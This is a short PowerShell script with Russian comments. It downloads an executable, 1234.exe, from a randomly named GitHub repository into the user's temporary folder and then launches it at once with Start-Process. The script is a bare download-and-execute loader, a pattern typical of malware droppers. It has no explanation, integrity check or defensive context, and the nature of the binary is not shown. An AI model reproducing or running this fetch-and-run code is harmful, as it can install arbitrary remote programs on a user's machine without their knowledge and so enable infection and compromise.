# Указываем URL и путь к сохранению
$url = "https://github.com/asakwaza/HHIHIASHDI1test/raw/refs/heads/main/1234.exe"
$output = "$env:TEMP\1234.exe"

# Скачиваем файл
Invoke-WebRequest -Uri $url -OutFile $output

# Открываем файл
Start-Process $output